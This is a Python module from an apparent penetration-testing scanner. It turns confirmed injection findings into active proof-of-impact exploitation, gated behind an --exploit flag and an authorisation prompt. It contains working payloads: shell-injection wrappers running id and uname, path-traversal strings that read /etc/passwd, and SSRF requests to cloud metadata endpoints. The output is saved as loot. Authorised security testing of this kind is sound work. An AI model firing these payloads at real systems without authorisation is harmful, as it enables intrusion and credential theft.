"""
engage — active exploitation engagement (the 'engage' profile).

Turns Hades from a scanner into an auto-exploitation engine. It first runs the active
injection arsenal to confirm vulnerabilities, then — only with --exploit on an authorised
target — actively **proves impact** for each confirmed bug with a *benign* proof payload and
writes the captured output as an evidence file under loot/<host>_<timestamp>/:

  * Command injection → runs a harmless command (`id`, `uname -a`) and captures the output (RCE proof)
  * LFI / path traversal → reads /etc/passwd and saves it (arbitrary file read)
  * SSRF → fetches cloud-metadata / file:// and saves the response (internal access)

SQL injection continues through the dedicated sqlmap launcher (offered automatically with
--exploit). Nothing destructive, no persistence/backdoor, no DoS — proof of impact only.
Detection-only by default; exploitation requires --exploit + the authorisation confirmation.
"""
from __future__ import annotations

import importlib
import re
from urllib.parse import unquote, urlparse

from loguru import logger

from scanner.engine import Finding, Severity, ScanEngine
from scanner.severity import severity_rank
from scanner.vulns._common import Injector, is_safe_mode, iter_injectors
from scanner.db.db_security import _loot_dir, _save_evidence  # reuse the loot/evidence convention

MODULE = "engage"

# Active injection modules whose detections engage orchestrates (reused, not duplicated).
_VULN_MODULES = [
    "scanner.vulns.command_injection",
    "scanner.vulns.lfi_detect",
    "scanner.vulns.ssrf_detect",
    "scanner.vulns.ssti_detect",
    "scanner.vulns.sqli_detect",
    "scanner.vulns.xss_detect",
    "scanner.vulns.open_redirect",
]

# Finding module → exploitation category engage knows how to actively prove.
_EXPLOITABLE = {
    "command_injection": "cmd",
    "lfi_detect": "lfi",
    "ssrf_detect": "ssrf",
}

# Benign proof payloads (read-only / informational — never destructive).
_RCE_CMDS = ["id", "uname -a"]
# A real newline is URL-encoded correctly by the injector (→ %0A); a literal "%0a"
# would be double-encoded, so use "\n" to mirror the command_injection payloads.
_CMD_WRAPPERS = ["; {c}", "| {c}", "&& {c}", "`{c}`", "$({c})", "\n{c}"]
_RCE_SIG = re.compile(r"uid=\d+\(|gid=\d+\(|Linux \S+ \d|Darwin Kernel")

_LFI_PAYLOADS = ["/etc/passwd", "../../../../../../../../etc/passwd",
                 "....//....//....//....//etc/passwd", "/etc/passwd%00"]
_PASSWD_SIG = re.compile(r"root:.*?:0:0:")

_SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",          # AWS IMDS
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    "file:///etc/passwd",
]
# Content only a real fetched metadata/file response contains — NOT substrings of the
# payload (so a reflected URL never matches) and NOT generic words like "instance".
_SSRF_CONTENT_RE = re.compile(
    r"ami-id|instance-id|iam/security-credentials|public-keys/|local-ipv4|reservation-id|"
    r"service-accounts/|numeric-project-id|compute/v1/|root:.*?:0:0:", re.I)


# ---------------------------------------------------------------------------
# Finding helper
# ---------------------------------------------------------------------------

def _f(title: str, desc: str, sev: Severity, rec: str, category: str,
       cwe: str = "", owasp: str = "", mitre: list[str] | None = None, **raw) -> Finding:
    raw["engage_category"] = category
    raw.setdefault("confidence", "high")
    return Finding(module=MODULE, title=title, description=desc, severity=sev,
                   recommendation=rec, raw=raw, cwe=cwe, owasp=owasp, mitre=list(mitre or []))


# ---------------------------------------------------------------------------
# Active exploitation routines (benign, proof-of-impact only)
# ---------------------------------------------------------------------------

def _exploit_cmd(inj: Injector, loot) -> Finding | None:
    for cmd in _RCE_CMDS:
        for wrapper in _CMD_WRAPPERS:
            payload = wrapper.format(c=cmd)
            resp = inj.inject(payload)
            if resp is None:
                continue
            m = _RCE_SIG.search(resp.text)
            if not m:
                continue
            snippet = m.group(0)
            proof = inj.proof(payload) if inj.proof else inj.url or ""
            evidence = _save_evidence(loot, f"rce_{inj.param}.txt", resp.text[:4000])
            return _f(
                f"RCE Confirmed — Command Output Captured ('{inj.param}')",
                f"Injected the harmless command '{cmd}' into {inj.label} and captured its output "
                f"({snippet!r}), proving remote command execution on the target host.",
                Severity.CRITICAL,
                "Never pass user input to a shell; use safe APIs / allow-lists and drop OS-command calls.",
                "rce", cwe="CWE-78", owasp="A03:2021 Injection", mitre=["T1059"],
                parameter=inj.param, proof_url=proof, evidence_file=evidence,
                loot_snippet=snippet, exploit_cmd=(f"curl -sk \"{proof}\"" if proof else ""))
    return None


def _exploit_lfi(inj: Injector, loot) -> Finding | None:
    for payload in _LFI_PAYLOADS:
        resp = inj.inject(payload)
        if resp is None or not _PASSWD_SIG.search(resp.text):
            continue
        users = ", ".join(line.split(":")[0] for line in resp.text.splitlines()
                          if ":0:0:" in line or "/home/" in line)[:120]
        proof = inj.proof(payload) if inj.proof else ""
        evidence = _save_evidence(loot, f"lfi_passwd_{inj.param}.txt", resp.text[:6000])
        return _f(
            f"Arbitrary File Read — /etc/passwd Extracted ('{inj.param}')",
            f"Read /etc/passwd through {inj.label} via path traversal. Sample accounts: {users}. "
            "Confirms arbitrary server-side file disclosure (source, config and secrets are reachable).",
            Severity.CRITICAL,
            "Reject path separators in file parameters; resolve against an allow-list and a fixed base dir.",
            "file_read", cwe="CWE-22", owasp="A01:2021 Broken Access Control", mitre=["T1083"],
            parameter=inj.param, proof_url=proof, evidence_file=evidence,
            loot_snippet="/etc/passwd: " + users, exploit_cmd=(f"curl -sk \"{proof}\"" if proof else ""))
    return None


def _exploit_ssrf(inj: Injector, loot) -> Finding | None:
    for target in _SSRF_TARGETS:
        resp = inj.inject(target)
        if resp is None or resp.status_code >= 400:
            continue
        # Strip our reflected payload, then require real fetched-metadata/file content.
        body = unquote(resp.text).replace(target, "").replace(unquote(target), "")
        low = body.lower()
        if "<html" in low or "<!doctype" in low:   # a reflected HTML page is NOT SSRF
            continue
        if not _SSRF_CONTENT_RE.search(body):
            continue
        proof = inj.proof(target) if inj.proof else ""
        evidence = _save_evidence(loot, f"ssrf_{inj.param}.txt", body[:4000])
        return _f(
            f"SSRF → Internal Resource Read ('{inj.param}')",
            f"Forced the server to fetch {target} via {inj.label} and captured the response, proving "
            "server-side request forgery to internal/cloud resources (potential credential theft).",
            Severity.CRITICAL,
            "Allow-list outbound hosts, block link-local/metadata ranges, and disable unused URL schemes.",
            "ssrf_read", cwe="CWE-918", owasp="A10:2021 Server-Side Request Forgery", mitre=["T1190"],
            parameter=inj.param, proof_url=proof, evidence_file=evidence,
            loot_snippet=body[:80], exploit_cmd=(f"curl -sk \"{proof}\"" if proof else ""))
    return None


_EXPLOIT_FN = {"cmd": _exploit_cmd, "lfi": _exploit_lfi, "ssrf": _exploit_ssrf}


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------

def run(engine: ScanEngine) -> list[Finding]:
    safe = is_safe_mode(engine)
    findings: list[Finding] = []

    # 1. Detection — reuse the active injection arsenal.
    for modpath in _VULN_MODULES:
        try:
            findings.extend(importlib.import_module(modpath).run(engine))
        except Exception as exc:  # noqa: BLE001 — one module must not abort the engagement
            logger.warning(f"engage: {modpath} detection failed: {exc}")

    active = bool(getattr(engine, "exploit", False)) and not safe

    if not active:
        findings.append(_f(
            "Engagement — Detection Only (exploitation not authorised)",
            "Vulnerabilities above were confirmed but not exploited because active exploitation was "
            "not authorised (answer 'attack' at the prompt, or pass --exploit). Doing so reads files / "
            "executes commands / pulls cloud metadata to prove impact and collects evidence under loot/.",
            Severity.INFO, "", "info"))
        findings.sort(key=lambda f: severity_rank(f.severity.value))
        return findings

    # 2. Active exploitation — prove impact with benign payloads, capture evidence.
    # Confirmed bugs only (skip the INFO "none detected" notes that share a module name).
    confirmed = [f for f in findings if f.module in _EXPLOITABLE
                 and f.severity.value != "info" and (f.raw or {}).get("parameter")]
    loot = _loot_dir(engine) if confirmed else None
    injectors = {inj.param: inj for inj in iter_injectors(engine)} if confirmed else {}
    done: set[tuple[str, str]] = set()
    footholds = 0

    for f in confirmed:
        category = _EXPLOITABLE[f.module]
        param = f.raw["parameter"]
        key = (category, param)
        if key in done or param not in injectors:
            continue
        done.add(key)
        try:
            result = _EXPLOIT_FN[category](injectors[param], loot)
        except Exception as exc:  # noqa: BLE001
            logger.warning(f"engage: exploit {category}/{param} failed: {exc}")
            result = None
        if result:
            findings.append(result)
            footholds += 1

    # 3. Engagement result summary.
    sev = Severity.CRITICAL if footholds else Severity.INFO
    findings.append(_f(
        f"Engagement Result: {footholds} foothold(s) proven",
        f"Active exploitation captured {footholds} proof(s) of impact (RCE / file read / SSRF). "
        + (f"Evidence written under {loot}." if footholds else "No confirmed bug was actively exploitable."),
        sev, "Treat every proven foothold as a breach; remediate the root-cause injection.",
        "result", footholds=footholds, loot_dir=str(loot)))

    findings.sort(key=lambda f: severity_rank(f.severity.value))
    return findings


# ---------------------------------------------------------------------------
# Dedicated console panel (called from engine.run_scan)
# ---------------------------------------------------------------------------

def render_panel(findings: list[Finding]) -> None:
    """Render the Engagement panel (proven footholds + loot). No-op if engage didn't run."""
    eng = [f for f in findings if f.module == MODULE
           and f.raw.get("engage_category") not in (None, "info", "result")]
    result = next((f for f in findings if f.raw.get("engage_category") == "result"), None)
    # Only show the panel when there is at least one proven foothold.
    if not eng:
        return

    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box

    console = Console()
    table = Table(box=box.SIMPLE_HEAD, show_header=True, header_style="bold bright_white",
                  expand=True, padding=(0, 1))
    table.add_column("Impact", width=22, no_wrap=True)
    table.add_column("Proof / loot", ratio=1)
    table.add_column("Evidence", width=26, no_wrap=True)

    for f in eng:
        cat = f.raw.get("engage_category", "")
        table.add_row(f"[bold red]{cat.upper()}[/]", f"{f.title}\n[dim]{f.raw.get('loot_snippet','')}[/dim]",
                      f.raw.get("evidence_file", "") or "—")

    footholds = result.raw.get("footholds", 0) if result else len(eng)
    console.print()
    console.print(Panel(table, title="[bold red]💀 Active Engagement — Proven Impact[/bold red]",
                        subtitle=f"[dim]{footholds} foothold(s) · evidence under loot/ · authorised testing only[/dim]",
                        border_style="red", padding=(1, 2)))
